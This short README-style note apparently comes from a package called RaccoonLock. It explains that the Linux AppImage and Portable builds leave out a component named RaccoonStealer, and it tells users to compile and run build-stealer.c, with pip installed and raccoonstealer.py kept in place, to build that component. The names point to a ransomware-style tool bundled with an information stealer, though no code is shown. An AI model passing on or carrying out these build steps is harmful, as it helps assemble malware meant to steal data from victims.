Due to the differences between GNU/Linux distros, AppImage and Portable versions of RaccoonLock do not include RaccoonStealer.
To build a RaccoonStealer compatible with your system, please compile and run build-stealer.c. Make sure you have previously installed pip in your system.
Also make sure you don't delete the file "raccoonstealer.py" as you need it to run build-stealer.
